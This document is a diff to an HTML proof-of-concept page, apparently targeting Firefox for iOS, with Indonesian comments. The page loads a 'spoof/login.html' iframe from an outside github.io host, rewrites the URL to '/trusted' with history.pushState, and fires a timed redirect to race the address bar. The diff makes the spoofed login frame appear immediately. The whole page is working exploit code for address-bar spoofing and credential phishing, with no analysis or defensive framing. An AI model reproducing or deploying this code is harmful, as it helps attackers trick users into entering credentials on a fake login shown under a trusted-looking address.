@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Firefox iOS Omnibar Trigger PoC</title>
+<title>Firefox iOS Navigation Race PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
 body {
@@ -16,7 +16,6 @@ iframe {
   border: 1px solid #ddd;
   border-radius: 12px;
   margin-top: 16px;
-  display: none; /* awalnya disembunyikan */
 }
 .notice {
   margin-top: 14px;
@@ -28,6 +27,7 @@ iframe {
 </head>
 <body>
 
+<!-- iframe muncul otomatis -->
 <iframe
   id="childFrame"
   src="https://cnfdnfial-ops.github.io/spoof/login.html"
@@ -35,28 +35,20 @@ iframe {
 </iframe>
 
 <div class="notice">
-  Firefox iOS only — tap omnibar to trigger iframe
+  Firefox iOS only — observe address bar & navigation race
 </div>
 
 <script>
-const iframe = document.getElementById('childFrame');
-
-/* deteksi focus kembali setelah user tap omnibar */
-window.addEventListener('focus', () => {
-  if (!iframe.style.display || iframe.style.display === 'none') {
-    iframe.style.display = 'block'; // baru tampil
-  }
-});
-
-/* optional: pushState untuk origin race */
+/* Step 1: URL manipulation, happens immediately */
 history.pushState({}, '', '/trusted');
 
+/* Step 2: Navigation race, fires after page show */
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
         location.href = 'https://google.com:9090';
-      }, 80);
+      }, 80); // race timing
     });
   });
 });
